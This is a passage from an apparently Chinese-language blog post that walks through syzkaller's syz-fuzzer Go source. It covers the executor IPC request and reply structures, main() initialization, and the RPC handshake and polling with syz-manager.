class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> executeReq <span class="hljs-keyword">struct</span> &#123;<br>magic            <span class="hljs-type">uint64</span><br>envFlags         <span class="hljs-type">uint64</span> <span class="hljs-comment">// env flags</span><br>execFlags        <span class="hljs-type">uint64</span> <span class="hljs-comment">// exec flags</span><br>pid              <span class="hljs-type">uint64</span><br>syscallTimeoutMS <span class="hljs-type">uint64</span><br>programTimeoutMS <span class="hljs-type">uint64</span><br>slowdownScale    <span class="hljs-type">uint64</span><br>progSize         <span class="hljs-type">uint64</span><br><span class="hljs-comment">// 该结构体之后跟着一个 encodingexec 格式的序列化的测试程序.</span><br><span class="hljs-comment">// Both when sent over a pipe or in shared memory.</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以理解为 <code>executeReq</code> 为单次请求的请求头，后面跟着的序列化输入程序 <code>progData</code> 为单次请求的请求体，故 syz-fuzzer 向 syz-executor 发送单个程序执行请求的示例如下：</p><p><img src="https://s2.loli.net/2023/04/24/I6od1evyCE3MZWH.png" alt="image.png"></p><h3 id="2-executeReply-amp-callReply：executor-方响应的单个系统调用执行结果"><a href="#2-executeReply-amp-callReply：executor-方响应的单个系统调用执行结果" class="headerlink" title="2. executeReply &amp; callReply：executor 方响应的单个系统调用执行结果"></a>2. executeReply &amp; callReply：executor 方响应的单个系统调用执行结果</h3><p>有收便有发，syz-executor 在完成执行后会通过另一个管道将执行结果发送给 syz-fuzzer，由于 syzkaller 以单个系统调用为执行的最小粒度，因此syz-executor 每次返回给 syz-fuzzer 的便是<strong>单个系统调用的执行结果</strong>，使用一个头部 <code>executeReply</code> 标识信息，使用 <code>callReply</code> 存储具体结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> executeReply <span class="hljs-keyword">struct</span> &#123;<br>magic <span class="hljs-type">uint32</span><br><span class="hljs-comment">// If done is 0, then this is call completion message followed by callReply.</span><br><span class="hljs-comment">// If done is 1, then program execution is finished and status is set.</span><br>done   <span class="hljs-type">uint32</span><br>status <span class="hljs-type">uint32</span><br>&#125;<br><br><span class="hljs-keyword">type</span> callReply <span class="hljs-keyword">struct</span> &#123;<br>magic      <span class="hljs-type">uint32</span><br>index      <span class="hljs-type">uint32</span> <span class="hljs-comment">// call index in the program</span><br>num        <span class="hljs-type">uint32</span> <span class="hljs-comment">// syscall number (for cross-checking)</span><br>errno      <span class="hljs-type">uint32</span><br>flags      <span class="hljs-type">uint32</span> <span class="hljs-comment">// see CallFlags</span><br>signalSize <span class="hljs-type">uint32</span><br>coverSize  <span class="hljs-type">uint32</span><br>compsSize  <span class="hljs-type">uint32</span><br><span class="hljs-comment">// signal/cover/comps follow</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>executeReply</code> 中的 done 标志位用以标识传输是否结束，对于来自 syz-fuzzer 的单次执行请求，syz-executor 的返回结果如下（以一个 <code>done != 0</code> 的 <code>executeReply</code> 作为终止）：</p><p><img src="https://s2.loli.net/2023/04/24/seE43rD2uaXCbwj.png" alt="image.png"></p><h1 id="0x02-main-：与-manager-建立-RPC-连接，进行初始化工作"><a href="#0x02-main-：与-manager-建立-RPC-连接，进行初始化工作" class="headerlink" title="0x02. main()：与 manager 建立 RPC 连接，进行初始化工作"></a>0x02. main()：与 manager 建立 RPC 连接，进行初始化工作</h1><p>我们还是按照惯例从程序入口点进行分析，<code>syz-fuzzer()</code> 的 <code>main()</code> 函数做的工作比较简单，主要还是一些初始化工作以及引导后续工作流程</p><h2 id="初始化参数解析与-RPC-连接，获取语料库与输入"><a href="#初始化参数解析与-RPC-连接，获取语料库与输入" class="headerlink" title="初始化参数解析与 RPC 连接，获取语料库与输入"></a>初始化参数解析与 RPC 连接，获取语料库与输入</h2><h3 id="Step-I-一些初始化工作"><a href="#Step-I-一些初始化工作" class="headerlink" title="Step.I - 一些初始化工作"></a>Step.I - 一些初始化工作</h3><p>一开始还是惯例的各种初始化和配置参数解析工作</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// nolint: funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>debug.SetGCPercent(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">var</span> (<br>flagName     = flag.String(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;unique name for manager&quot;</span>)<br>flagOS       = flag.String(<span class="hljs-string">&quot;os&quot;</span>, runtime.GOOS, <span class="hljs-string">&quot;target OS&quot;</span>)<br>flagArch     = flag.String(<span class="hljs-string">&quot;arch&quot;</span>, runtime.GOARCH, <span class="hljs-string">&quot;target arch&quot;</span>)<br>flagManager  = flag.String(<span class="hljs-string">&quot;manager&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;manager rpc address&quot;</span>)<br>flagProcs    = flag.Int(<span class="hljs-string">&quot;procs&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;number of parallel test processes&quot;</span>)<br>flagOutput   = flag.String(<span class="hljs-string">&quot;output&quot;</span>, <span class="hljs-string">&quot;stdout&quot;</span>, <span class="hljs-string">&quot;write programs to none/stdout/dmesg/file&quot;</span>)<br>flagTest     = flag.Bool(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;enable image testing mode&quot;</span>)      <span class="hljs-comment">// used by syz-ci</span><br>flagRunTest  = flag.Bool(<span class="hljs-string">&quot;runtest&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;enable program testing mode&quot;</span>) <span class="hljs-comment">// used by pkg/runtest</span><br>flagRawCover = flag.Bool(<span class="hljs-string">&quot;raw_cover&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;fetch raw coverage&quot;</span>)<br>)<br><span class="hljs-keyword">defer</span> tool.Init()()<br>outputType := parseOutputType(*flagOutput)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;fuzzer started&quot;</span>)<br><br>target, err := prog.GetTarget(*flagOS, *flagArch)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br><br>config, execOpts, err := ipcconfig.Default(target)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create default ipc config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> *flagRawCover &#123;<br>execOpts.Flags &amp;^= ipc.FlagDedupCover<br>&#125;<br>timeouts := config.Timeouts<br>sandbox := ipc.FlagsToSandbox(config.Flags)<br></code></pre></td></tr></table></figure><p>接下来会创建一个 <code>shutdown</code> channel 并启动一个协程进行监测，当该 channel 有数据时说明遇到了一些情况，此时 syz-fuzzer 需要主动退出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">shutdown := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br>osutil.HandleInterrupts(shutdown)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// Handles graceful preemption on GCE.</span><br>&lt;-shutdown<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;SYZ-FUZZER: PREEMPTED&quot;</span>)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>osutil.HandleInterrupts()</code> 则是一个根据不同的目标 os 进行定制的函数，对于 unix 系 os 而言该函数定义于 <code>osutil_unix.go</code> 中，其会等待收到三个 SIGINT 信号才真正关闭程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// HandleInterrupts 在第一个 SIGINT 时关闭 shutdown chan</span><br><span class="hljs-comment">// (希望程序能优雅地 shutdown 并 exit)</span><br><span class="hljs-comment">// 并在第三个 SIGINT 时终止程序.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HandleInterrupts</span><span class="hljs-params">(shutdown <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)</span></span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> os.Signal, <span class="hljs-number">3</span>)<br>signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)<br>&lt;-c<br><span class="hljs-built_in">close</span>(shutdown)<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: shutting down...\n&quot;</span>)<br>&lt;-c<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: shutting down harder...\n&quot;</span>)<br>&lt;-c<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: terminating\n&quot;</span>)<br>os.Exit(<span class="hljs-type">int</span>(syscall.SIGINT))<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-II-与-syz-manager-间建立-RPC-通信，加载语料库"><a href="#Step-II-与-syz-manager-间建立-RPC-通信，加载语料库" class="headerlink" title="Step.II - 与 syz-manager 间建立 RPC 通信，加载语料库"></a>Step.II - 与 syz-manager 间建立 RPC 通信，加载语料库</h3><p>回到 <code>main()</code> 中，接下来会收集 Guest 信息并尝试与 Host（syz-manager） 间建立 RPC 连接，若失败则直接退出，这里我们传给 syz-manager 的是 <code>rpctype.ConnectArgs</code>，收到的响应结果为 <code>rpctype.ConnectRes</code> ，其中包含有很多信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">checkArgs := &amp;checkArgs&#123;<br>target:         target,<br>sandbox:        sandbox,<br>ipcConfig:      config,<br>ipcExecOpts:    execOpts,<br>gitRevision:    prog.GitRevision,<br>targetRevision: target.Revision,<br>&#125;<br><span class="hljs-keyword">if</span> *flagTest &#123;<br>testImage(*flagManager, checkArgs)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>machineInfo, modules := collectMachineInfos(target)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;dialing manager at %v&quot;</span>, *flagManager)<br>manager, err := rpctype.NewRPCClient(*flagManager, timeouts.Scale)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create an RPC client: %v &quot;</span>, err)<br>&#125;<br><br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;connecting to manager...&quot;</span>)<br>a := &amp;rpctype.ConnectArgs&#123;<br>Name:        *flagName,<br>MachineInfo: machineInfo,<br>Modules:     modules,<br>&#125;<br>r := &amp;rpctype.ConnectRes&#123;&#125;<br><span class="hljs-keyword">if</span> err := manager.Call(<span class="hljs-string">&quot;Manager.Connect&quot;</span>, a, r); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to call Manager.Connect(): %v &quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>syz-fuzzer 中的 RPC 都会调用到 <code>syz-manager/rpc.go</code> 中的 <code>RPCServer</code> 的成员函数，我们最终会调用到 syz-manager 上的 <code>Connect()</code> 函数进行连接，其核心是调用 <code>RPCServer.RPCManagerView.fuzzerConnect()</code> 最小化语料库并拷贝 BugFrame 等信息，这里就不展开分析了：）</p><p>接下来解析要开启的特性标志位；随后检查与 syz-manager 进行 RPC 连接的响应结果中的 <code>CoverFilterBitmap</code> 是否为空，不为空则写入到 <code>&quot;syz-cover-bitmap&quot;</code> 文件中，该信息主要是给 syz-executor 用的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">featureFlags, err := csource.ParseFeaturesFlags(<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-literal">true</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">if</span> r.CoverFilterBitmap != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err := osutil.WriteFile(<span class="hljs-string">&quot;syz-cover-bitmap&quot;</span>, r.CoverFilterBitmap); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write syz-cover-bitmap: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后若 syz-manager 返回结果中的 <code>CheckResult</code> 为空，则重新生成配置信息后通过 RPC 调用 syz-manager 的 <code>Manager.Check()</code> ，若有错误则直接退出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.CheckResult == <span class="hljs-literal">nil</span> &#123;<br>checkArgs.gitRevision = r.GitRevision<br>checkArgs.targetRevision = r.TargetRevision<br>checkArgs.enabledCalls = r.EnabledCalls<br>checkArgs.allSandboxes = r.AllSandboxes<br>checkArgs.featureFlags = featureFlags<br>r.CheckResult, err = checkMachine(checkArgs)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> r.CheckResult == <span class="hljs-literal">nil</span> &#123;<br>r.CheckResult = <span class="hljs-built_in">new</span>(rpctype.CheckArgs)<br>&#125;<br>r.CheckResult.Error = err.Error()<br>&#125;<br>r.CheckResult.Name = *flagName<br><span class="hljs-keyword">if</span> err := manager.Call(<span class="hljs-string">&quot;Manager.Check&quot;</span>, r.CheckResult, <span class="hljs-literal">nil</span>); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Manager.Check call failed: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> r.CheckResult.Error != <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, r.CheckResult.Error)<br>&#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>这次 RPC 实际上会调用到 syz-manager 中的 <code>machineChecked()</code>，该函数会调用 <code>loadCorpus()</code> <strong>完成语料库的加载</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> machineChecked(a *rpctype.CheckArgs, enabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span>) &#123;<br>mgr.mu.Lock()<br><span class="hljs-keyword">defer</span> mgr.mu.Unlock()<br>mgr.checkResult = a<br>mgr.targetEnabledSyscalls = enabledSyscalls<br>mgr.target.UpdateGlobs(a.GlobFiles)<br>mgr.loadCorpus()<br>mgr.firstConnect = time.Now()<br>&#125;<br></code></pre></td></tr></table></figure><p>回到 syz-fuzzer，若 <code>CheckResult</code> 不为空则调用 <code>target.UpdateGlobs()</code> 将 manager 返回数据存放到 <code>GlobFiles</code> 映射中，再调用 <code>Setup()</code> 根据所开启的特性配置 executor 的参数并调用 <code>osutil.RunCmd()</code> 在 5min 后启动 executor，这里就不展开了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">else</span> &#123;<br>target.UpdateGlobs(r.CheckResult.GlobFiles)<br><span class="hljs-keyword">if</span> err = host.Setup(target, r.CheckResult.Features, featureFlags, config.Executor); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-III-初始化-Fuzzer-结构信息，获取-input-与-candidate"><a href="#Step-III-初始化-Fuzzer-结构信息，获取-input-与-candidate" class="headerlink" title="Step.III - 初始化 Fuzzer 结构信息，获取 input 与 candidate"></a>Step.III - 初始化 Fuzzer 结构信息，获取 input 与 candidate</h3><p>之后日志输出开启的系统调用数量及特性信息，创建 IPC 配置信息，若设置了 <code>runtest</code> 标志位（默认为 false）则调用 <code>runTest()</code> 后直接返回，这个主要是测试用的这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syscalls: %v&quot;</span>, <span class="hljs-built_in">len</span>(r.CheckResult.EnabledCalls[sandbox]))<br><span class="hljs-keyword">for</span> _, feat := <span class="hljs-keyword">range</span> r.CheckResult.Features.Supported() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v: %v&quot;</span>, feat.Name, feat.Reason)<br>&#125;<br>createIPCConfig(r.CheckResult.Features, config)<br><br><span class="hljs-keyword">if</span> *flagRunTest &#123;<br>runTest(target, manager, *flagName, config.Executor)<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>之后创建 <code>needPoll</code> channel 并写入数据，主要用来标识是否需要向 <code>syz-manager()</code> 发起 poll（向 syz-manager 获取语料库与 candidate）；接下来创建了一个标识当前 <code>syz-fuzzer</code> 信息的 Fuzzer 结构体以及一个 <code>ipc.Gate</code> 结构体（用于将并发级别和窗口限制为给定的值）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><br>needPoll := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;, <span class="hljs-number">1</span>)<br>needPoll &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>fuzzer := &amp;Fuzzer&#123;<br>name:                     *flagName,<br>outputType:               outputType,<br>config:                   config,<br>execOpts:                 execOpts,<br>workQueue:                newWorkQueue(*flagProcs, needPoll),<br>needPoll:                 needPoll,<br>manager:                  manager,<br>target:                   target,<br>timeouts:                 timeouts,<br>faultInjectionEnabled:    r.CheckResult.Features[host.FeatureFault].Enabled,<br>comparisonTracingEnabled: r.CheckResult.Features[host.FeatureComparisons].Enabled,<br>corpusHashes:             <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[hash.Sig]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>checkResult:              r.CheckResult,<br>fetchRawCover:            *flagRawCover,<br>noMutate:                 r.NoMutateCalls,<br>stats:                    <span class="hljs-built_in">make</span>([]<span class="hljs-type">uint64</span>, StatCount),<br>&#125;<br>gateCallback := fuzzer.useBugFrames(r, *flagProcs)<br>fuzzer.gate = ipc.NewGate(<span class="hljs-number">2</span>**flagProcs, gateCallback)<br><br></code></pre></td></tr></table></figure><p>接下来是一个小循环，调用 <code>poll()</code> 以<strong>向 syz-manager 获取语料库与 candidate 加入到本地工作队列中</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> needCandidates, more := <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>; more; needCandidates = <span class="hljs-literal">false</span> &#123;<br>more = fuzzer.poll(needCandidates, <span class="hljs-literal">nil</span>)<br><span class="hljs-comment">// 该循环在 qemu 模拟中为 &quot;no output&quot; , 以告诉 manager 我们还没死.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;fetching corpus: %v, signal %v/%v (executing program)&quot;</span>,<br><span class="hljs-built_in">len</span>(fuzzer.corpus), <span class="hljs-built_in">len</span>(fuzzer.corpusSignal), <span class="hljs-built_in">len</span>(fuzzer.maxSignal))<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="poll-：通过-RPC-向-syz-manager-获取语料库与-candidate-加入本地工作队列中"><a href="#poll-：通过-RPC-向-syz-manager-获取语料库与-candidate-加入本地工作队列中" class="headerlink" title="poll()：通过 RPC 向 syz-manager 获取语料库与 candidate 加入本地工作队列中"></a>poll()：通过 RPC 向 syz-manager 获取语料库与 candidate 加入本地工作队列中</h4><p>该函数主要做了两件事：</p><ul><li>通过 RPC 向 syz-manager 获取语料库与 candidate</li><li>将获得的 candidate 加入本地工作队列中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(fuzzer *Fuzzer)</span></span> poll(needCandidates <span class="hljs-type">bool</span>, stats <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span>) <span class="hljs-type">bool</span> &#123;<br>a := &amp;rpctype.PollArgs&#123;<br>Name:           fuzzer.name,<br>NeedCandidates: needCandidates,<br>MaxSignal:      fuzzer.grabNewSignal().Serialize(),<br>Stats:          stats,<br>&#125;<br>r := &amp;rpctype.PollRes&#123;&#125;<br>    <span class="hljs-comment">/* RPC 向 syz-manager 请求信息 */</span> <br><span class="hljs-keyword">if</span> err := fuzzer.manager.Call(<span class="hljs-string">&quot;Manager.Poll&quot;</span>, a, r); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Manager.Poll call failed: %v&quot;</span>, err)<br>&#125;<br>    <span class="hljs-comment">/* 解析：最大信号数量 */</span><br>maxSignal := r.MaxSignal.Deserialize()<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;poll: candidates=%v inputs=%v signal=%v&quot;</span>,<br><span class="hljs-built_in">len</span>(r.Candidates), <span class="hljs-built_in">len</span>(r.NewInputs), maxSignal.Len())<br>fuzzer.addMaxSignal(maxSignal)<br>    <span class="hljs-comment">/* 解析：syz-manager 给予的从其他 fuzzer 获得的新输入 */</span><br><span class="hljs-keyword">for</span> _, inp := <span class="hljs-keyword">range</span> r.NewInputs &#123;<br>fuzzer.addInputFromAnotherFuzzer(inp)<br>&#125;<br>    <span class="hljs-comment">/* 解析：candidate */</span><br><span class="hljs-keyword">for</span> _, candidate := <span class="hljs-keyword">range</span> r.Candidates &#123;<br>fuzzer.addCandidateInput(candidate)<br>&#125;<br><span class="hljs-keyword">if</span> needCandidates &amp;&amp; <span class="hljs-built_in">len</span>(r.Candidates) == <span class="hljs-number">0</span> &amp;&amp; atomic.LoadUint32(&amp;fuzzer.triagedCandidates) == <span class="hljs-number">0</span> &#123;<br>atomic.StoreUint32(&amp;fuzzer.triagedCandidates, <span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(r.NewInputs) != <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(r.Candidates) != <span class="hljs-number">0</span> || maxSignal.Len() != <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该函数会通过 RPC 调用到 syz-manager 中 <code>syz-manager/rpc.go</code> 下的 <code>Poll()</code> 函数：</p><ul><li>首先会获取在 syz-manager 中该 syz-fuzzer 的信息，并检查最大信号量</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(serv *RPCServer)</span></span> Poll(a *rpctype.PollArgs, r *rpctype.PollRes) <span class="hljs-type">error</span> &#123;<br>serv.stats.mergeNamed(a.Stats)<br><br>serv.mu.Lock()<br><span class="hljs-keyword">defer</span> serv.mu.Unlock()<br><br>f := serv.fuzzers[a.Name]<br><span class="hljs-keyword">if</span> f == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 若我们调用了 shutdownInstance 、但已经有一个来自该实例的待处理请求，则这是有可能的</span><br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;poll: fuzzer %v is not connected&quot;</span>, a.Name)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>newMaxSignal := serv.maxSignal.Diff(a.MaxSignal.Deserialize())<br><span class="hljs-keyword">if</span> !newMaxSignal.Empty() 